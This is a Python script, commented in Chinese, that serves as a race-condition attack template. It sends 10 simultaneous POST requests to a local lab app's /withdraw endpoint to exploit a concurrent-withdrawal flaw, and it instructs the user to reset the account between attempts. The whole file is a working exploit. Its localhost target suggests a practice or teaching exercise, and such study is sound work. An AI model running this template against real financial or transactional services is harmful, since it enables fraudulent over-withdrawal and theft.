"""
条件竞争攻击脚本模板
用法：python race_template.py
每次攻击前先打开浏览器访问 http://127.0.0.1:5025/reset 重置账号
"""

import requests
import threading

# ============================================================
#  配置区：只需要改下面 3 个参数
# ============================================================

# 目标路由（你要攻击的功能的 POST 地址）
URL = "http://127.0.0.1:5025/withdraw"

# 表单数据（对应 HTML form 里的 input）
DATA = {"amount": "100"}

# 线程数（同时发多少个请求）
THREADS = 10


# ============================================================
#  第 1 步：写一个函数，发一个请求
# ============================================================
def attack():
    try:
        r = requests.post(URL, data=DATA)
        print(f"  线程发送完毕，状态码: {r.status_code}")
    except Exception as e:
        print(f"  线程出错: {e}")


# ============================================================
#  第 2 步：创建 N 个线程
# ============================================================
print(f"准备发送 {THREADS} 个并发请求到 {URL}")
threads = []
for i in range(THREADS):
    t = threading.Thread(target=attack)
    threads.append(t)


# ============================================================
#  第 3 步：同时启动所有线程
# ============================================================
print("开始发送...")
for t in threads:
    t.start()

# 等所有线程跑完
for t in threads:
    t.join()

print("全部完成！打开浏览器刷新 http://127.0.0.1:5025 看结果")
print()


